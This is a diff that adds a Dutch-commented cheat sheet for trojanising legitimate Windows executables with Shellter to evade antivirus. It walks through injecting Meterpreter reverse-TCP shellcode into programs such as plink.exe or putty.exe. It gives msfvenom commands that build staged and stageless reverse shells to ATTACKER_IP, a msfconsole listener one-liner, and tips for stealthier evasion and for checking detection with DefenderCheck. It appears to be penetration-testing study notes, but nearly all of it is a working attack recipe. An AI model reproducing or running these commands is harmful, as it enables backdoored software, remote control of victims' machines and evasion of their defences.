@@ -1,0 +1,38 @@
+# Shellter - PE Injection voor AV Evasion
+# === Installatie ===
+# Kali: sudo apt install shellter
+# Vereist: wine (32-bit) als je op Linux draait
+sudo dpkg --add-architecture i386 && sudo apt update && sudo apt install wine32
+# === Automatische modus ===
+# Start shellter:
+shellter
+# Kies: A (Auto)
+# PE Target: /usr/share/windows-binaries/plink.exe (of andere legit PE)
+# Payload: L (Listed)
+# Kies: 1 (meterpreter_reverse_tcp)
+# LHOST: ATTACKER_IP
+# LPORT: 443
+# === Handmatige modus (betere evasion) ===
+# Start shellter:
+shellter
+# Kies: M (Manual)
+# PE Target: pad/naar/legit.exe
+# Tracing engine zal beschikbare code caves vinden
+# Custom payload: C:\path\to\raw_shellcode.bin
+# === Shellcode genereren voor Shellter ===
+# Raw shellcode (voor custom payload):
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shellcode.bin
+# Staged vs stageless:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o staged.bin
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o stageless.bin
+# === Listener starten ===
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 443; exploit"
+# === Goede PE targets voor injection ===
+# /usr/share/windows-binaries/plink.exe
+# /usr/share/windows-binaries/whoami.exe
+# WinSCP.exe, 7zFM.exe, putty.exe (van internet)
+# Tip: Gebruik 32-bit PE targets (shellter is 32-bit)
+# Tip: Auto modus is sneller maar Manual geeft betere evasion
+# Tip: Download verse kopie van legit executable voor elke encoding
+# Tip: Stealth mode (-s) behoudt originele functionaliteit van de PE
+# Tip: Test met DefenderCheck of ThreatCheck voor verificatie
